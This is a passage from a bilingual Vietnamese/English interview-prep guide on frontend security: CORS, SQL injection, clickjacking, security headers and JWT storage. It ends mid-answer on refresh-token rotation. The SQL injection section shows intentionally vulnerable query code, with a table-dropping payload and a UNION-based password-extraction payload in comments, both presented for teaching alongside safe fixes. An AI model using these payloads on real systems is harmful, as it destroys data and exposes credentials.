"Đây là hiểu lầm phổ biến. CORS thực ra là cơ chế browser-enforced bảo vệ user, không phải server. Same-Origin Policy nói: 'JavaScript trên evil.com không thể đọc responses từ bank.com.' CORS là cách server relax restriction đó. Từ khóa là 'đọc' — CORS không ngăn browser gửi request, chỉ ngăn JavaScript đọc response nếu server chưa cấp quyền. CORS chỉ áp dụng cho browser-based requests từ JavaScript — curl/mobile app/server-to-server hoàn toàn bypass CORS. Nên CORS không bảo vệ chống CSRF, vẫn cần CSRF protection, authentication, idempotency checks."

---

**Q2 (Mid): "When does a browser send a preflight request, and why does it exist?"**

**Model Answer:**
"The browser sends a preflight OPTIONS request before any 'non-simple' cross-origin request. A simple request is basically: GET or POST with only standard headers and a content type of `application/x-www-form-urlencoded`, `multipart/form-data`, or `text/plain`.

As soon as you deviate from that — using PUT, DELETE, PATCH, or adding custom headers like `Authorization` or `Content-Type: application/json` — the browser first sends OPTIONS to ask the server: 'Are you okay with this kind of request from this origin?'

The server responds with the Access-Control headers indicating what it allows, and only if those headers give the green light does the browser proceed with the actual request.

The reason it exists is historical. Before CORS, browsers allowed cross-origin POST requests with certain content types because that's what HTML forms could do anyway. But more powerful request methods and custom headers were new to JavaScript — so the spec introduced a preflight check to give servers a chance to opt in before potentially dangerous requests are sent.

From a performance perspective, preflights add a round trip. You can cache them using `Access-Control-Max-Age` — setting it to 86400 seconds means the browser won't preflight again for 24 hours for the same request type."

**Trả lời (Tiếng Việt):**
"Browser gửi preflight OPTIONS request trước bất kỳ 'non-simple' cross-origin request. Simple request = GET hoặc POST với standard headers và content-type là application/x-www-form-urlencoded, multipart/form-data, hoặc text/plain. Ngay khi dùng PUT/DELETE/PATCH hoặc custom headers như Authorization hay Content-Type: application/json → browser gửi OPTIONS hỏi server 'okay không với loại request này từ origin này?' → server trả Access-Control headers → browser proceed nếu được green light. Lý do: historical — HTML forms có thể cross-origin POST nên không cần preflight, nhưng methods/headers mới của JavaScript cần server opt-in. Performance: preflights thêm round trip → cache bằng Access-Control-Max-Age."

---

**Q3 (Mid): "What's the bug in this CORS configuration: `Access-Control-Allow-Origin: *` combined with `Access-Control-Allow-Credentials: true`?"**

**Model Answer:**
"The browser will actually reject this combination — it's explicitly disallowed by the CORS spec.

The wildcard `*` for `Allow-Origin` means any site can read the response. But `Allow-Credentials: true` means cookies and auth headers are included in the request. Allowing any origin to read a credentialed response would be catastrophic — it would mean any malicious site could make authenticated requests on behalf of the user and read the responses.

So browsers refuse to honor this combination. If you include `credentials: 'include'` on the fetch call and the server responds with `Access-Control-Allow-Origin: *`, the browser blocks the response entirely, even though the server said to allow it.

The fix is to always use a specific origin when credentials are involved: `Access-Control-Allow-Origin: https://app.example.com`. On the server you typically maintain an allowlist of trusted origins and dynamically reflect the request origin if it's in the list — you can't set multiple origins in the header, so you reflect the matching one.

A common mistake I've seen is developers setting `*` to 'fix' a CORS error quickly, then enabling credentials and wondering why it's broken. The two features are intentionally incompatible."

**Trả lời (Tiếng Việt):**
"Browser thực sự reject combination này — bị disallow bởi CORS spec. Wildcard * cho Allow-Origin = mọi site đọc được response. Allow-Credentials: true = cookies và auth headers được gửi kèm. Cho phép bất kỳ origin đọc credentialed response = thảm họa (mọi site độc hại có thể authenticated request thay user và đọc response). Fix: luôn dùng specific origin khi credentials liên quan (Access-Control-Allow-Origin: https://app.example.com). Server maintain allowlist trusted origins và dynamically reflect matching origin — không set được multiple origins trong header. Lỗi phổ biến: developer set * để 'fix' CORS error nhanh, bật credentials, tự hỏi tại sao broken."

---

**Q4 (Senior): "How would you debug a CORS issue in production where preflight requests are sometimes failing?"**

**Model Answer:**
"Intermittent CORS failures are tricky because they're often environmental rather than a straight misconfiguration.

First I'd look at the actual request and response headers in the Network tab. For preflight failures, the OPTIONS response is the key — specifically whether `Access-Control-Allow-Origin`, `Access-Control-Allow-Methods`, and `Access-Control-Allow-Headers` all correctly match what the browser is sending in `Access-Control-Request-Method` and `Access-Control-Request-Headers`.

'Sometimes failing' suggests the issue is dynamic. A few common causes: the origin validation logic has a bug that fails for certain origins or request paths; the server has multiple instances and one is misconfigured; a load balancer or CDN is caching preflight responses incorrectly and returning a stale response with the wrong `Allow-Origin`; or environment-specific config that's not deployed consistently.

CDN caching of preflight responses is particularly sneaky. If your CDN caches the OPTIONS response and the cached response has the wrong origin, requests from other origins will fail until the cache expires. The fix is to make sure the CDN varies its cache on the `Origin` request header, and to set a reasonable `Access-Control-Max-Age` so preflight results are cached by the browser rather than the CDN.

I'd also add server-side logging on the CORS middleware that logs the requested origin and whether it was allowed — that gives you a way to see patterns in the failures."

**Trả lời (Tiếng Việt):**
"Intermittent CORS failures thường environmental hơn là misconfiguration. Đầu tiên xem actual request/response headers trong Network tab — OPTIONS response là chìa khóa: Access-Control-Allow-Origin/Allow-Methods/Allow-Headers có đúng với Access-Control-Request-Method/Request-Headers không? 'Đôi khi fail' gợi ý issue động: origin validation logic bug, multiple instances misconfigured, CDN caching preflight responses sai (cached response với wrong origin). CDN caching đặc biệt sneaky — fix: CDN vary cache trên Origin request header, set reasonable Access-Control-Max-Age để browser cache preflight thay vì CDN. Thêm server-side logging trên CORS middleware ghi requested origin và allowed/blocked."

---

---

## 5. SQL Injection

**Level:** [Junior] / [Mid]

**EN:** Why should frontend developers understand SQL injection? How do ORMs prevent it, and what patterns should you avoid?

**VI:** Tại sao frontend developer cần hiểu SQL injection? ORM ngăn chặn nó như thế nào?

**Trả lời:**

```ts
// ==============================
// SQL INJECTION — tại sao FE dev cần biết
// ==============================

/*
  1. FE dev thường viết API calls với user input → input đó đến DB
  2. BFF (Backend for Frontend) pattern — FE dev viết Node.js layer
  3. Serverless functions (Next.js API routes, tương tác DB trực tiếp)
  4. Code review — cần nhận ra vulnerable patterns
*/

// ==============================
// VULNERABLE CODE — ĐỪNG LÀM
// ==============================

// String concatenation trực tiếp — SQL injection
async function getUserByEmail_UNSAFE(email: string) {
  const query = `SELECT * FROM users WHERE email = '${email}'`;
  // Nếu email = "'; DROP TABLE users; --"
  // Query trở thành: SELECT * FROM users WHERE email = ''; DROP TABLE users; --'
  return db.query(query);
}

// Tương tự với tìm kiếm
async function searchProducts_UNSAFE(searchTerm: string) {
  const query = `SELECT * FROM products WHERE name LIKE '%${searchTerm}%'`;
  // searchTerm = "' UNION SELECT username, password FROM users --"
  return db.query(query);
}

// ==============================
// AN TOÀN — Parameterized Queries
// ==============================

// Node.js với pg (node-postgres)
import { Pool } from 'pg';
const pool = new Pool();

async function getUserByEmail_SAFE(email: string) {
  // Parameterized query — DB driver tự escape
  const result = await pool.query(
    'SELECT id, name, email FROM users WHERE email = $1',
    [email]  // parameter binding
  );
  return result.rows[0];
}

// MySQL với mysql2
import mysql from 'mysql2/promise';

async function getProductById(id: number) {
  const [rows] = await connection.execute(
    'SELECT * FROM products WHERE id = ?',
    [id]
  );
  return rows[0];
}

// ==============================
// ORM — Prisma (tự động parameterize)
// ==============================
import { PrismaClient } from '@prisma/client';
const prisma = new PrismaClient();

// AN TOÀN — Prisma tự parameterize tất cả inputs
async function getUser(email: string) {
  return prisma.user.findUnique({
    where: { email },  // Prisma xử lý escaping
    select: { id: true, name: true, email: true }, // không select password
  });
}

async function searchProducts(searchTerm: string, minPrice: number) {
  return prisma.product.findMany({
    where: {
      name: { contains: searchTerm, mode: 'insensitive' },
      price: { gte: minPrice },
    },
  });
}

// Prisma raw queries — PHẢI dùng template literal hoặc $queryRawUnsafe cẩn thận
// AN TOÀN
const result = await prisma.$queryRaw`
  SELECT * FROM users WHERE email = ${email}
`;

// NGUY HIỂM
const result = await prisma.$queryRawUnsafe(
  `SELECT * FROM users WHERE email = '${email}'`  // ĐỪNG LÀM
);

// ==============================
// Next.js API Route — pattern an toàn
// ==============================
// app/api/users/route.ts
import { NextRequest, NextResponse } from 'next/server';
import { z } from 'zod';

const searchSchema = z.object({
  email: z.string().email(),
  page: z.coerce.number().int().min(1).default(1),
});

export async function GET(request: NextRequest) {
  const { searchParams } = new URL(request.url);

  // Validate input trước — không trust raw query params
  const parsed = searchSchema.safeParse({
    email: searchParams.get('email'),
    page: searchParams.get('page'),
  });

  if (!parsed.success) {
    return NextResponse.json({ error: 'Invalid input' }, { status: 400 });
  }

  const user = await prisma.user.findUnique({
    where: { email: parsed.data.email },
  });

  return NextResponse.json(user);
}
```

---

## 6. Clickjacking

**Level:** [Mid]

**EN:** What is clickjacking? How do `X-Frame-Options` and the `frame-ancestors` CSP directive prevent it?

**VI:** Clickjacking là gì? `X-Frame-Options` và CSP `frame-ancestors` ngăn chặn nó như thế nào?

**Trả lời:**

**Clickjacking**: Kẻ tấn công nhúng website vào iframe trong trang của chúng, sau đó dùng UI tricks khiến user vô tình click vào actions trong iframe (như "Transfer Money", "Delete Account").

```ts
// ==============================
// X-Frame-Options (HTTP header cũ)
// ==============================

/*
  X-Frame-Options: DENY               — không cho phép frame trong bất kỳ context nào
  X-Frame-Options: SAMEORIGIN         — chỉ cho phép same-origin frames
  X-Frame-Options: ALLOW-FROM url     — chỉ cho phép specific URL (deprecated, không supported tốt)
*/

// Express
app.use((req, res, next) => {
  res.setHeader('X-Frame-Options', 'SAMEORIGIN');
  next();
});

// Helmet
import helmet from 'helmet';
app.use(helmet.frameguard({ action: 'sameorigin' }));
// hoặc
app.use(helmet.frameguard({ action: 'deny' }));

// ==============================
// frame-ancestors CSP — cách mới, flexible hơn
// ==============================

/*
  frame-ancestors 'none'           — như X-Frame-Options: DENY
  frame-ancestors 'self'           — như SAMEORIGIN
  frame-ancestors https://admin.example.com  — chỉ cho phép specific origin
  frame-ancestors https:           — cho phép tất cả HTTPS
*/

// Content-Security-Policy: frame-ancestors 'self' https://trusted.example.com

app.use(
  helmet.contentSecurityPolicy({
    directives: {
      frameAncestors: ["'self'"],  // hoặc ["'none'"] cho strict
      // ...other directives
    },
  })
);

// ==============================
// JavaScript frame-busting (fallback — ít đáng tin hơn)
// ==============================

// Kiểm tra nếu page đang trong iframe
if (window.top !== window.self) {
  // Page đang trong frame
  window.top!.location.href = window.self.location.href;
  // Hoặc hiển thị cảnh báo
  document.body.innerHTML = '<p>This page cannot be displayed in a frame.</p>';
}

// Tại sao frame-busting không đủ:
// 1. Kẻ tấn công có thể dùng sandbox attribute: <iframe sandbox="allow-scripts">
// 2. JavaScript có thể bị disabled
// 3. Luôn dùng HTTP headers làm giải pháp chính
```

---

## 7. Security Headers

**Level:** [Mid] / [Senior]

**EN:** Explain these security headers: `X-Content-Type-Options`, `Strict-Transport-Security (HSTS)`, `Referrer-Policy`. Why is `X-XSS-Protection` deprecated?

**VI:** Giải thích các security headers: `X-Content-Type-Options`, `HSTS`, `Referrer-Policy`. Tại sao `X-XSS-Protection` deprecated?

**Trả lời:**

```ts
// ==============================
// Helmet.js — set tất cả security headers
// ==============================
import helmet from 'helmet';

app.use(helmet()); // enable tất cả defaults

// Cấu hình chi tiết:
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
    },
  },
  hsts: {
    maxAge: 31536000,       // 1 năm (tính bằng giây)
    includeSubDomains: true,
    preload: true,
  },
  referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
  xContentTypeOptions: true, // X-Content-Type-Options: nosniff
  frameguard: { action: 'sameorigin' },
}));

/*
  ==========================================
  1. X-Content-Type-Options: nosniff
  ==========================================
  Ngăn browser "MIME sniffing" — đoán content-type từ file content thay vì server header.

  Attack: Upload file text/plain chứa JavaScript → browser có thể execute như script.
  Fix: nosniff → browser phải tuân theo Content-Type header chính xác.

  Ví dụ: image.jpg thực chất là script → không execute vì server nói image/jpeg
*/

res.setHeader('X-Content-Type-Options', 'nosniff');

/*
  ==========================================
  2. Strict-Transport-Security (HSTS)
  ==========================================
  Buộc browser chỉ kết nối qua HTTPS, không bao giờ HTTP.

  max-age: thời gian browser nhớ (giây)
  includeSubDomains: áp dụng cho tất cả subdomains
  preload: submit vào browser HSTS preload list (hardcoded vào browser binary)

  Attack prevented: SSL stripping (MITM downgrade HTTPS → HTTP)
  Ví dụ: user gõ http://bank.com → không kết nối HTTP → browser tự redirect HTTPS
*/

// Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
res.setHeader(
  'Strict-Transport-Security',
  'max-age=31536000; includeSubDomains; preload'
);

// QUAN TRỌNG: Chỉ set HSTS trên HTTPS connections
// Một khi set, KHÔNG dễ undo (phải chờ max-age hết hạn)

/*
  ==========================================
  3. Referrer-Policy
  ==========================================
  Kiểm soát thông tin nào được gửi trong Referer header khi navigate.

  no-referrer                      — không gửi gì
  no-referrer-when-downgrade       — không gửi HTTPS → HTTP (default browser)
  origin                           — chỉ gửi origin (https://example.com), không path
  origin-when-cross-origin         — full URL same-origin, chỉ origin cross-origin
  strict-origin-when-cross-origin  — origin same-origin, chỉ origin nếu same security level
  unsafe-url                       — luôn gửi full URL (kể cả sensitive paths)

  Vấn đề: URL có thể chứa thông tin nhạy cảm
  https://app.com/users/123/reset-password?token=abc123
  → Nếu page này load external resource, token sẽ leak trong Referer header
*/

res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');

/*
  ==========================================
  4. X-XSS-Protection: 1; mode=block (DEPRECATED)
  ==========================================
  Header cũ kích hoạt XSS Auditor trong Chrome/IE — đã bị xóa.

  Tại sao deprecated:
  - Chrome đã xóa XSS Auditor (Chrome 78+)
  - Có thể bị exploit để enable XSS thay vì block
  - CSP làm tốt hơn nhiều

  Không cần set header này nữa, CSP là giải pháp đúng.
*/

// ==============================
// Đầy đủ security headers response
// ==============================
function setSecurityHeaders(res: Response) {
  const headers = {
    'X-Content-Type-Options': 'nosniff',
    'X-Frame-Options': 'SAMEORIGIN',
    'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
    'Referrer-Policy': 'strict-origin-when-cross-origin',
    'Permissions-Policy': 'camera=(), microphone=(), geolocation=(self)',
    'Content-Security-Policy': "default-src 'self'; script-src 'self'; object-src 'none'",
  };

  Object.entries(headers).forEach(([key, value]) => {
    res.setHeader(key, value);
  });
}
```

### 🎤 Mock Interview — Q&A

---

**Q1 (Junior): "What does `X-Content-Type-Options: nosniff` do and why does it matter?"**

**Model Answer:**
"Without this header, browsers try to be 'helpful' by guessing the content type of a response based on the file content, rather than trusting the `Content-Type` header the server sent. This is called MIME sniffing.

The attack scenario goes like this: an attacker uploads a file to your server — maybe a profile picture — that is labeled as `image/jpeg` but actually contains JavaScript. Normally that shouldn't matter because the browser should treat it as an image. But without `nosniff`, some browsers peek at the file contents, decide it looks like JavaScript, and execute it. That's an XSS vector through what looks like a harmless file upload.

`X-Content-Type-Options: nosniff` tells the browser: 'Trust the Content-Type header I send you. Don't sniff.' So if I say it's `image/jpeg`, treat it as an image — don't execute it as a script.

It's a one-liner to add with any header middleware like Helmet, and there's essentially no downside to enabling it."

**Trả lời (Tiếng Việt):**
"Không có header này, browser cố gắng 'helpful' bằng cách đoán content type từ file content thay vì trust Content-Type header server gửi — gọi là MIME sniffing. Attack: attacker upload file label là image/jpeg nhưng chứa JavaScript → một số browser sniff file contents, quyết định nó là JavaScript, và execute → XSS qua file upload tưởng chừng vô hại. nosniff nói với browser: 'Trust Content-Type header tôi gửi, đừng sniff.' One-liner với Helmet, không có downside khi enable."

---

**Q2 (Mid): "What is HSTS and what attack does it prevent?"**

**Model Answer:**
"HSTS stands for HTTP Strict Transport Security. It's a header that tells browsers: 'This site must only be accessed over HTTPS. If you ever receive a request to connect over plain HTTP, upgrade it to HTTPS automatically — don't even try the HTTP connection.'

The attack it prevents is SSL stripping, which is a man-in-the-middle attack. The scenario is: a user is on public Wi-Fi and types `bank.com` into their browser. Without HSTS, the browser first makes an HTTP request, then gets redirected to HTTPS. An attacker sitting in the middle can intercept that initial HTTP request and downgrade the connection — the user ends up talking to the attacker over HTTP while the attacker forwards to the bank over HTTPS. The user sees no obvious warning.

With HSTS, after the first visit to the site, the browser remembers that it must use HTTPS and refuses to make the initial HTTP connection. The attack can't happen because there's no HTTP request to intercept.

The `preload` directive takes this further — you submit your domain to a list that's baked into browser binaries, so even first-time visitors are protected, since the browser already knows to use HTTPS before making any network request at all.

One caution: once you set HSTS with a long `max-age`, it's hard to undo. If your HTTPS cert expires or you need to go back to HTTP for any reason, users who have the HSTS cached will be unable to connect until the max-age expires."

**Trả lời (Tiếng Việt):**
"HSTS = HTTP Strict Transport Security. Header nói với browser: 'Site này phải chỉ access qua HTTPS. Nếu nhận request HTTP, tự động upgrade — đừng thử HTTP connection.' Ngăn SSL stripping — MITM attack. Scenario: user trên public Wi-Fi gõ bank.com → không có HSTS → browser gửi HTTP request trước, get redirected HTTPS → attacker ở giữa intercept HTTP request đầu tiên và downgrade connection → user nói chuyện với attacker qua HTTP. Với HSTS: browser nhớ phải dùng HTTPS, từ chối HTTP connection. preload directive = submit domain vào list baked vào browser binary → ngay cả first-time visitors được bảo vệ. Cảnh báo: một khi set HSTS với max-age dài, rất khó undo."

---

**Q3 (Mid): "What does `Referrer-Policy` control, and what's the security risk it mitigates?"**

**Model Answer:**
"The `Referer` header — historically misspelled with one 'r' — is sent by browsers to tell a server where the request came from. When you click a link on `google.com` to `mysite.com`, the request to `mysite.com` includes `Referer: https://google.com/search?q=something`.

The security risk is that URLs sometimes contain sensitive data. Think about a password reset flow: the URL might be `https://app.com/reset?token=abc123xyz`. If that page loads any third-party resources — analytics scripts, embedded fonts, a tracking pixel — those requests include `Referer: https://app.com/reset?token=abc123xyz`. The token just leaked to a third party.

The `Referrer-Policy` header controls what ends up in that header. The recommended setting is `strict-origin-when-cross-origin`: for same-origin requests, send the full URL; for cross-origin requests, only send the origin — `https://app.com` — without the path or query string. For HTTPS-to-HTTP downgrades, send nothing at all.

This way internal navigation still works smoothly, but sensitive information in your URL paths doesn't leak to external services."

**Trả lời (Tiếng Việt):**
"Referer header (historically misspelled với một 'r') được browser gửi để nói với server request đến từ đâu. Risk: URLs đôi khi chứa sensitive data. Password reset flow URL có thể là `https://app.com/reset?token=abc123`. Nếu page đó load third-party resources (analytics, fonts, tracking pixel) → requests đó include Referer header chứa token → token bị leak. Referrer-Policy kiểm soát gì vào header. Recommended: `strict-origin-when-cross-origin` — same-origin requests gửi full URL; cross-origin requests chỉ gửi origin (https://app.com) không có path/query string; HTTPS-to-HTTP = không gửi gì. Internal navigation vẫn smooth, sensitive info trong URL không leak ra external services."

---

**Q4 (Senior): "Why was `X-XSS-Protection` deprecated and what replaced it?"**

**Model Answer:**
"X-XSS-Protection enabled a built-in XSS Auditor that existed in Chrome and IE. The idea was that the browser would inspect both the request parameters and the response body, and if it detected a reflection — the same script in both places — it would block or sanitize it. Reflected XSS in theory.

It was deprecated for two reasons. First, Chrome removed the XSS Auditor in version 78 because it was actually possible to abuse it to enable XSS attacks rather than prevent them. Certain CSP configurations or URL patterns could cause the auditor to incorrectly suppress legitimate content or be tricked into allowing malicious content through.

Second, CSP does the job far better and more comprehensively. A proper CSP with a strict `script-src` directive prevents inline scripts from executing regardless of whether they're reflected — it doesn't need to inspect request parameters and guess intent. And CSP works against Stored XSS too, which the XSS Auditor never handled.

Today the guidance is clear: don't set `X-XSS-Protection` at all — setting it to `0` to explicitly disable the auditor is actually recommended for legacy browsers to avoid the abuse scenarios. Your energy should go into CSP, input sanitization, and proper output encoding."

**Trả lời (Tiếng Việt):**
"X-XSS-Protection kích hoạt XSS Auditor trong Chrome và IE — inspect request params và response body, detect reflection (script xuất hiện ở cả hai) → block. Deprecated vì hai lý do: (1) Chrome xóa XSS Auditor trong version 78 vì có thể abuse để enable XSS thay vì prevent, một số CSP configurations hoặc URL patterns có thể khiến auditor suppress nội dung hợp lệ hoặc bị trick allow malicious content. (2) CSP làm tốt hơn và toàn diện hơn — strict script-src ngăn inline scripts execute bất kể có reflected hay không, không cần inspect request params. CSP cũng handle Stored XSS mà XSS Auditor không làm được. Hôm nay: đừng set X-XSS-Protection — set về 0 để explicitly disable auditor còn được recommend cho legacy browsers. Tập trung vào CSP, input sanitization, và proper output encoding."

---

---

## 8. Authentication vs Authorization & JWT

**Level:** [Mid] / [Senior]

**EN:** Explain Authentication vs Authorization. Describe JWT structure, where to store tokens (`httpOnly` cookie vs `localStorage`), and the refresh token pattern.

**VI:** Giải thích Authentication vs Authorization. JWT structure, nên lưu token ở đâu, và refresh token pattern?

**Trả lời:**

- **Authentication (AuthN)**: Bạn là ai? (verify identity — login)
- **Authorization (AuthZ)**: Bạn được làm gì? (permissions, roles)

```ts
// ==============================
// JWT Structure: header.payload.signature
// ==============================

/*
  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9   ← header (base64url)
  .
  eyJzdWIiOiJ1c2VyXzEyMyIsIm5hbWUiOiJBbGljZSIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjE2MjM5MDIyLCJleHAiOjE2MTYyNDI2MjJ9  ← payload (base64url)
  .
  SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c  ← signature (HMAC-SHA256 hoặc RS256)

  Header: { "alg": "HS256", "typ": "JWT" }
  Payload: { "sub": "user_123", "name": "Alice", "role": "user", "iat": 1616239022, "exp": 1616242622 }
  Signature: HMACSHA256(base64url(header) + "." + base64url(payload), secret)
*/

// QUAN TRỌNG: JWT payload KHÔNG được mã hóa, chỉ encode base64
// Không bao giờ để thông tin nhạy cảm trong JWT

// Node.js JWT
import jwt from 'jsonwebtoken';

const JWT_SECRET = process.env.JWT_SECRET!;
const JWT_REFRESH_SECRET = process.env.JWT_REFRESH_SECRET!;

function generateTokens(userId: string, role: string) {
  const accessToken = jwt.sign(
    { sub: userId, role },
    JWT_SECRET,
    { expiresIn: '15m' }  // access token ngắn
  );

  const refreshToken = jwt.sign(
    { sub: userId },
    JWT_REFRESH_SECRET,
    { expiresIn: '7d' }   // refresh token dài
  );

  return { accessToken, refreshToken };
}

function verifyAccessToken(token: string) {
  return jwt.verify(token, JWT_SECRET) as { sub: string; role: string };
}

// ==============================
// localStorage vs httpOnly Cookie
// ==============================

/*
  localStorage:
  ❌ Accessible qua JavaScript → XSS attack có thể đánh cắp token
  ❌ Không tự động gửi → cần manually add Authorization header
  ✅ Không bị CSRF (không tự động gửi)
  ✅ Dễ implement
  ✅ Accessible trong Web Workers
  → KHÔNG dùng cho access tokens nhạy cảm

  sessionStorage:
  ❌ Cũng accessible qua JS (same XSS problem)
  ✅ Clear khi đóng tab
  → Cũng không an toàn

  httpOnly Cookie:
  ✅ KHÔNG accessible qua JavaScript → XSS không đánh cắp được
  ✅ Tự động gửi cùng request (cùng domain)
  ⚠️ Dễ bị CSRF → cần SameSite=Strict/Lax + CSRF protection
  ✅ Secure flag → chỉ gửi qua HTTPS
  → ĐÂY LÀ CÁCH AN TOÀN NHẤT cho refresh tokens

  Best practice: Access token trong memory (React state), Refresh token trong httpOnly cookie
*/

// ==============================
// Refresh Token Pattern
// ==============================

// Backend
app.post('/api/auth/login', async (req, res) => {
  const { email, password } = req.body;

  const user = await authenticateUser(email, password);
  if (!user) return res.status(401).json({ error: 'Invalid credentials' });

  const { accessToken, refreshToken } = generateTokens(user.id, user.role);

  // Lưu refresh token hash vào DB (để có thể revoke)
  await saveRefreshToken(user.id, hashToken(refreshToken));

  // Access token trả về body (frontend lưu trong memory)
  // Refresh token trong httpOnly cookie
  res.cookie('refreshToken', refreshToken, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    maxAge: 7 * 24 * 60 * 60 * 1000, // 7 days
    path: '/api/auth',  // chỉ gửi đến /api/auth endpoints
  });

  res.json({ accessToken, user: { id: user.id, name: user.name, role: user.role } });
});

// Refresh endpoint
app.post('/api/auth/refresh', async (req, res) => {
  const refreshToken = req.cookies.refreshToken;
  if (!refreshToken) return res.status(401).json({ error: 'No refresh token' });

  try {
    const payload = jwt.verify(refreshToken, JWT_REFRESH_SECRET) as { sub: string };

    // Kiểm tra token có trong DB không (rotation + revocation)
    const storedToken = await getRefreshToken(payload.sub);
    if (!storedToken || !compareTokenHash(refreshToken, storedToken.hash)) {
      // Token reuse detected — possible theft — revoke all tokens
      await revokeAllTokens(payload.sub);
      return res.status(401).json({ error: 'Token reuse detected' });
    }

    const user = await getUserById(payload.sub);
    const { accessToken, refreshToken: newRefreshToken } = generateTokens(user.id, user.role);

    // Rotate refresh token (invalidate cái cũ, issue cái mới)
    await rotateRefreshToken(user.id, hashToken(newRefreshToken));

    res.cookie('refreshToken', newRefreshToken, {
      httpOnly: true, secure: true, sameSite: 'strict',
      maxAge: 7 * 24 * 60 * 60 * 1000,
    });

    res.json({ accessToken });
  } catch {
    res.status(401).json({ error: 'Invalid refresh token' });
  }
});

// ==============================
// Frontend — Token Management
// ==============================

// Lưu access token trong memory (React context/Zustand)
// KHÔNG localStorage
interface AuthState {
  accessToken: string | null;
  user: User | null;
}

const useAuthStore = create<AuthState>((set) => ({
  accessToken: null,
  user: null,
  setAuth: (token: string, user: User) => set({ accessToken: token, user }),
  clearAuth: () => set({ accessToken: null, user: null }),
}));

// Axios interceptor — tự động refresh khi 401
axiosInstance.interceptors.response.use(
  (response) => response,
  async (error) => {
    const original = error.config;

    if (error.response?.status === 401 && !original._retry) {
      original._retry = true;

      try {
        // Gọi refresh endpoint — browser tự gửi httpOnly cookie
        const { data } = await axios.post('/api/auth/refresh', {}, { withCredentials: true });
        const { accessToken } = data;

        useAuthStore.getState().setAuth(accessToken, /* ... */);
        original.headers.Authorization = `Bearer ${accessToken}`;

        return axiosInstance(original); // retry request gốc
      } catch {
        useAuthStore.getState().clearAuth();
        window.location.href = '/login';
      }
    }

    return Promise.reject(error);
  }
);
```

### 🎤 Mock Interview — Q&A

---

**Q1 (Junior): "What is the structure of a JWT? What information does each part contain?"**

**Model Answer:**
"A JWT is three base64url-encoded strings joined by dots: header, payload, and signature.

The header is a small JSON object that says what type of token it is — always `JWT` — and which algorithm was used to sign it, like `HS256` for HMAC-SHA256 or `RS256` for RSA.

The payload is where the actual claims live. Standard claims include `sub` for the subject — usually a user ID — `iat` for issued-at timestamp, and `exp` for expiration time. You can also add your own custom claims like the user's role or email.

The signature is computed by taking the encoded header and payload, concatenating them, and running them through the algorithm specified in the header using a secret key. This signature is what allows the server to verify the token hasn't been tampered with.

One critical thing to emphasize: the payload is NOT encrypted — it's just base64-encoded. Anyone who intercepts a JWT can decode it and read the claims. Never put sensitive information like passwords, credit card numbers, or internal IDs in a JWT payload. If you need confidentiality, you'd use JWE — JSON Web Encryption — which is different from JWT."

**Trả lời (Tiếng Việt):**
"JWT gồm ba base64url-encoded strings nối bằng dots: header, payload, signature. Header: small JSON nói type (luôn JWT) và algorithm (HS256 = HMAC-SHA256 hoặc RS256 = RSA). Payload: actual claims — sub (subject/user ID), iat (issued-at timestamp), exp (expiration), custom claims như role/email. Signature: encode header + payload, chạy qua algorithm trong header với secret key → server verify token chưa bị tamper. Critical: payload KHÔNG được encrypt — chỉ base64-encoded. Bất kỳ ai intercept JWT có thể decode và đọc claims. Không bao giờ đặt thông tin nhạy cảm (passwords, credit card, internal IDs) trong JWT payload. Nếu cần confidentiality → dùng JWE (JSON Web Encryption)."

---

**Q2 (Mid): "Where should you store a JWT on the frontend — localStorage, sessionStorage, or cookies? What are the trade-offs?"**

**Model Answer:**
"This is one of the most debated questions in auth, and the right answer is: neither localStorage nor sessionStorage for sensitive tokens.

localStorage is the most common choice because it's simple, but it's accessible to any JavaScript on the page. If your app has an XSS vulnerability — even in a third-party library — the attacker can do `localStorage.getItem('token')` and steal it silently.

sessionStorage has the same problem — it's still readable by JavaScript, just cleared when the tab closes.

httpOnly cookies are the more secure option. The `httpOnly` flag means JavaScript cannot read the cookie at all. Even if an attacker gets code running on your page, they can't access the cookie value. The downside is cookies are CSRF-vulnerable — the browser sends them automatically on any request to your domain — so you need to combine them with `SameSite=Strict` and CSRF tokens.

The pattern I prefer for SPAs: store the access token in memory — a React state variable or Zustand store. It exists only in the JavaScript heap for the lifetime of the tab. The refresh token goes in an httpOnly, Secure, SameSite=Strict cookie. When the access token expires, the app silently calls the refresh endpoint — the browser automatically sends the httpOnly cookie — and gets a new access token back.

This way: XSS can't steal the refresh token because it's httpOnly, and CSRF can't misuse the refresh token because SameSite blocks cross-site cookie submission."

**Trả lời (Tiếng Việt):**
"Câu trả lời đúng là: không dùng localStorage hay sessionStorage cho tokens nhạy cảm. localStorage: phổ biến vì đơn giản, nhưng accessible cho mọi JavaScript trên page — XSS vulnerability từ third-party library cũng đủ đánh cắp token. sessionStorage: cùng vấn đề, chỉ clear khi đóng tab. httpOnly cookies: secure hơn, JavaScript không đọc được (XSS không lấy được cookie value). Downside: CSRF-vulnerable → cần SameSite=Strict + CSRF tokens. Pattern ưa thích cho SPAs: access token trong memory (React state/Zustand), tồn tại trong JS heap suốt lifetime của tab. Refresh token trong httpOnly + Secure + SameSite=Strict cookie. Khi access token expire, app gọi refresh endpoint (browser tự gửi httpOnly cookie), nhận access token mới. XSS không steal refresh token (httpOnly), CSRF không misuse refresh token (SameSite block cross-site submission)."

---

**Q3 (Mid): "What is refresh token rotation and why is it important?"**

**Model Answer:**
"Refresh token rotation means that every time you use a refresh token to get a new access token, the server also issues a new refresh token and invalidates the old one. So each refresh token is single-use.

Without rotation, a stolen refresh token is catastrophic — it lets the attacker silently get new access tokens indefinitely, even after the legitimate user changes their password or logs out. The attacker has persistent access as long as the refresh token is valid.

With rotation, if a refresh token gets stolen and the attacker uses it, the original token becomes invalid. The next time the legitimate user's app tries to refresh — using the same original token that's now been superseded — the server detects a token reuse. At that point you know something is wrong — either there's a breach or a race condition — so the server revokes all refresh tokens for that user and forces a full re-login.

